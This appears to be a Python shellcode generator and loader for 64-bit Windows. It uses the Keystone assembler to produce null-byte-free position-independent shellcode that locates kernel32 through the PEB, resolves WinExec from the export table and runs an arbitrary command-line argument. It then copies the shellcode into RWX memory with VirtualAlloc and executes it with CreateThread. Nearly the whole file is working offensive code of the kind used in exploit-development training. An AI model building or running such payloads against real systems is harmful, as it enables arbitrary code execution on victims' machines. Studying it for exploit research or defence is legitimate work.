import ctypes, struct
import binascii
import os
import sys
argument=sys.argv[1]
import subprocess
from keystone import *


def encodeCommand(command):
    # Pad commands
    command = command.ljust(8, ' ')
    print("     making "+command+" multiple of 8...")
    # Convert ASCII characters to bytes
    result = "".join("{:02x}".format(ord(c)) for c in command)
    print("     converting to bytes...")
    # Reverse the bytes for little endian formatting
    ba = bytearray.fromhex(result)
    ba.reverse()
    ba.hex()
    return("     0x" + ba.hex())
 
def command(command):
    # Split command into 8 byte chunks
    size = 8
    print("splitting into 8 byte chunks...")
    chunks = [command[i:i+size] for i in range(0, len(command), size)]
 
    output = ""
 
    # Hack to account for uneven amount of data
    if (len(chunks) % 2 != 0):
       output += "mov rax, " + encodeCommand("        ") + "; "
       output += "push rax; "
 
    for i in reversed(chunks):
        output += "mov rax, " + encodeCommand(i) + "; "
        output += "push rax; "
 
    return output
def main():


    GET_KERNEL = (
        " start: "
        #" int3;"
        #"  sub rsp, 0x208;"                # Make some room on the stack (NULL BYTE)
        "  add rsp, 0xfffffffffffffdf8;"    # Avoid Null Byte
        " locate_kernel32:"
        "   xor rcx, rcx;"                  # Zero RCX contents
        "   mov rax, gs:[rcx + 0x60];"      # 0x060 ProcessEnvironmentBlock to RAX.
        "   mov rax, [rax + 0x18];"         # 0x18  ProcessEnvironmentBlock.Ldr Offset
        "   mov rsi, [rax + 0x20];"         # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
        "   lodsq;"                         # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
        "   xchg rax, rsi;"                 # Swap RAX,RSI
        "   lodsq;"                         # Load qword at address (R)SI into RAX
        "   mov rbx, [rax + 0x20] ;"        # RBX = Kernel32 base address
        "   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register
    )
    GET_EXPORTS = (
       # Code for parsing Export Address Table
        "   mov ebx, [rbx+0x3C]; "          # Get Kernel32 PE Signature (offset 0x3C) into EBX
        "   add rbx, r8; "                  # Add defrerenced signature offset to kernel32 base. Store in RBX.
       # "   mov edx, [rbx+0x88];"          # Offset from PE32 Signature to Export Address Table (NULL BYTE)
        "   xor r12,r12;"
        "   add r12, 0x88FFFFF;"
        "   shr r12, 0x14;"
        "   mov edx, [rbx+r12];"            # Offset from PE32 Signature to Export Address Table
         
        "   add rdx, r8;"                   # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
        "   mov r10d, [rdx+0x14];"          # Number of functions
        "   xor r11, r11;"                  # Zero R11 before use
        "   mov r11d, [rdx+0x20];"          # AddressOfNames RVA
        "   add r11, r8;"                   # AddressOfNames VMA
    )
    FIND_FUNCTION= (
        # Loop over Export Address Table to find WinExec name
        "   mov rcx, r10;"                  # Set loop counter
        "kernel32findfunction: "
        " jecxz FunctionNameFound;"         # Loop around this function until we find WinExec
        "   xor ebx,ebx;"                   # Zero EBX for use
        "   mov ebx, [r11+4+rcx*4];"        # EBX = RVA for first AddressOfName
        "   add rbx, r8;"                   # RBX = Function name VMA
        "   dec rcx;"                       # Decrement our loop by one
      # "   mov rax, 0x00636578456E6957;"   # WinExec (NULL BYTE)      
        "   mov rax, 0x636578456E6957FF;"   # WinExec
      # "   mov rax, 0x636F725074697845;"   # ExitProc
        "   shr rax, 0x8;"
        "   cmp [rbx], rax;"                # Check if we found WinExec
        "   jnz kernel32findfunction;"
 
        "FunctionNameFound: "
        # We found our target
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x24];"          # AddressOfNameOrdinals RVA
        "   add r11, r8;"                   # AddressOfNameOrdinals VMA
        # Get the function ordinal from AddressOfNameOrdinals
        "   inc rcx;"
        "   mov r13w, [r11+rcx*2];"         # AddressOfNameOrdinals + Counter. RCX = counter
        # Get function address from AddressOfFunctions
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x1c];"          # AddressOfFunctions RVA
        "   add r11, r8;"                   # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
        "   mov eax, [r11+4+r13*4];"        # Get the function RVA.
        "   add rax, r8;"                   # Add base address to function RVA
        "   mov r14, rax;"
    )


 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(GET_KERNEL)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
    instructions, count = ks.asm(GET_EXPORTS)

    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode

    instructions, count = ks.asm(FIND_FUNCTION)

    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode

    autopush=str(command(argument))
    print("resulting asm for push:")
    print(autopush)
    
    CALL_FUNCTION = (
        "" +  autopush + ""
        "  mov rcx, rsp;"                   # Move a pointer to calc.exe into RCX.
        "  xor rdx,rdx;"                    # Zero RDX   
        "  inc rdx;"                        # RDX set to 1 = uCmdShow
        "  sub rsp, 0x20;"                  # Make some room on the stack so it's not clobbered by WinExec
        "  call r14;"                       # Call WinExec
    )

    instructions, count = ks.asm(CALL_FUNCTION)

    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
    shellcode = bytearray(sh)
    print("Shellcode: "  + output )
    print("Bytes: " + str(len(sh)))
    print("Attaching debugger to " + str(os.getpid()));
    #subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()